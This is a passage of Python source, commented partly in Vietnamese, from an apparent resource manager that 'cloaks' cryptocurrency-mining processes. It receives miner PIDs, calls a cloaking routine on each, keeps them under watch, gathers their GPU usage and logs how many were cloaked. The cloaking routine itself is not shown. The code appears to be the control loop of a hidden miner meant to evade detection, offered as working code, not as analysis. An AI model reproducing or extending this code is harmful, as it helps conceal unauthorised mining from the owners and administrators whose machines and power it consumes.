        Process a single PID immediately with cloaking application.
        """
        try:
            pid = pid_data['pid']
            mining_process = pid_data['mining_process']
            source = pid_data['source']
            
            self.logger.info(f"🎯 [IMMEDIATE] Processing PID {pid} from {source}")
            
            # **Apply cloaking** (áp dụng cloaking)
            self.trigger_cloaking(mining_process, source)
            
            # **Add to monitored processes** (thêm vào processes được giám sát)
            self._monitored_processes[pid] = mining_process
            self._cloaking_stats['processes_cloaked'] += 1
            
            self.logger.info(f"✅ [IMMEDIATE] PID {pid} cloaked and added to monitoring")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [IMMEDIATE] Failed to process PID {pid_data.get('pid', 'unknown')}: {e}")
            self._cloaking_stats['failed_cloakings'] += 1
            return False
    
    def _execute_monitoring_cycle(self, current_time: float):
        """
        **🥇 SOLUTION 1: Execute Monitoring Cycle** (thực thi chu kỳ giám sát)
        
        Run a complete monitoring cycle cho all tracked processes.
        """
        try:
            if not self._monitored_processes:
                self.logger.debug("📊 [MONITOR] No processes to monitor")
                return
            
            self.logger.info(f"📊 [MONITOR] Starting monitoring cycle for {len(self._monitored_processes)} processes")
            
            # **Check process health** (kiểm tra sức khỏe process)
            dead_pids = []
            for pid, mining_process in self._monitored_processes.items():
                try:
                    # **Verify process still exists** (kiểm tra process vẫn tồn tại)
                    import psutil
                    proc = psutil.Process(pid)
                    
                    if not proc.is_running():
                        dead_pids.append(pid)
                        self.logger.info(f"💀 [MONITOR] Process {pid} is dead, removing from monitoring")
                    else:
                        # **Collect metrics** (thu thập metrics)
                        metrics = self.collect_metrics(mining_process)
                        self.logger.debug(f"📈 [MONITOR] PID {pid} metrics: GPU={metrics.get('gpu_usage', 0):.1f}%")
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    dead_pids.append(pid)
                    self.logger.info(f"💀 [MONITOR] Process {pid} no longer accessible, removing")
                except Exception as e:
                    self.logger.warning(f"⚠️ [MONITOR] Error checking PID {pid}: {e}")
            
            # **Clean up dead processes** (dọn dẹp processes đã chết)
            for pid in dead_pids:
                del self._monitored_processes[pid]
            
            # **Log monitoring stats** (ghi log thống kê giám sát)
            self.logger.info(f"📊 [MONITOR] Cycle complete: {len(self._monitored_processes)} active, {len(dead_pids)} removed")
            self.logger.info(f"📊 [STATS] Cloaked: {self._cloaking_stats['processes_cloaked']}, "
                           f"Failed: {self._cloaking_stats['failed_cloakings']}, "
                           f"Cycles: {self._cloaking_stats['monitoring_cycles']}")
            
        except Exception as e:
            self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")

    def stop(self):
        """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
        self.shutdown()